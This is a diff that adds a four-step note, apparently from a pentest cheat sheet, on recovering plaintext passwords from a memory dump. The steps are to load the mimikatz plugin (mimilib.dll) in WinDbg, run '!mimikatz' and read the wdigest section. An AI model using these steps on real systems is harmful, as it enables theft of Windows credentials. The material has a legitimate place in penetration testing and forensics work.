@@ -1,0 +1,4 @@
+- Use WinDbg to open the dmp file.
+- Download and load the mimikatz plugin in WinDbg (`.load <path_to_mimilib.dll>)
+-  Run `!mimikatz`
+- Find password under the `wdigest` section
